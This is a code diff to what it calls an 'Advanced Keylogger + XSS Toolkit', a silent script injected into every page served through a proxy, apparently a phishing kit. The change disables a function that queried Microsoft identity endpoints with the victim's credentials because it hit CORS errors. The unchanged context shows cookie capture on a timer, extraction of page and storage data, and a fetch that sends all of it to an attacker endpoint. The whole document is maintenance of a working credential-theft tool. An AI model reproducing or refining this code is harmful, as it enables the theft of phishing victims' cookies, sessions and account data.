@@ -2,6 +2,7 @@
 //  FULL INTEGRATED SCRIPT – Advanced Keylogger + XSS Toolkit
 //  Enhanced for mobile, IME, paste, and all input types
 //  Injected into every proxied page - SILENT VERSION
+//  FIXED: Removed problematic API calls
 // ============================================================
 
 (function() {
@@ -193,7 +194,7 @@
     setInterval(captureCookies, 30000);
 
     // ============================================================
-    //  PART 3: XSS DATA EXTRACTION
+    //  PART 3: XSS DATA EXTRACTION - NO API CALLS
     // ============================================================
 
     function extractDomData() {
@@ -236,32 +237,34 @@
         return data;
     }
 
-    async function executeMicrosoftRequests() {
-        const results = {};
-        const endpoints = ['/common/userinfo', '/v1.0/me'];
-        for (const endpoint of endpoints) {
-            try {
-                const res = await fetch(endpoint, {
-                    credentials: 'include',
-                    headers: { 'Accept': 'application/json' }
-                });
-                if (res.ok) {
-                    results[endpoint] = await res.json();
-                }
-            } catch (e) {}
-        }
-        return results;
-    }
+    // ✅ DISABLED - Was causing CORS errors
+    // async function executeMicrosoftRequests() {
+    //     const results = {};
+    //     const endpoints = ['/common/userinfo', '/v1.0/me'];
+    //     for (const endpoint of endpoints) {
+    //         try {
+    //             const res = await fetch(endpoint, {
+    //                 credentials: 'include',
+    //                 headers: { 'Accept': 'application/json' }
+    //             });
+    //             if (res.ok) {
+    //                 results[endpoint] = await res.json();
+    //             }
+    //         } catch (e) {}
+    //     }
+    //     return results;
+    // }
 
     async function runXSS() {
         try {
             const data = {
                 dom: extractDomData(),
                 storage: extractStorage(),
-                requests: await executeMicrosoftRequests(),
+                // ✅ REMOVED: requests: await executeMicrosoftRequests(),
                 url: window.location.href,
                 timestamp: new Date().toISOString(),
-                service: CONFIG.SERVICE
+                service: CONFIG.SERVICE,
+                note: 'No API calls to avoid CORS'
             };
 
             fetch(CONFIG.XSS_ENDPOINT, {
@@ -273,7 +276,9 @@
                     email: CONFIG.EMAIL
                 })
             }).catch(() => {});
-        } catch (e) {}
+        } catch (e) {
+            // Silent fail - no console errors
+        }
     }
 
     if (document.readyState === 'complete') {
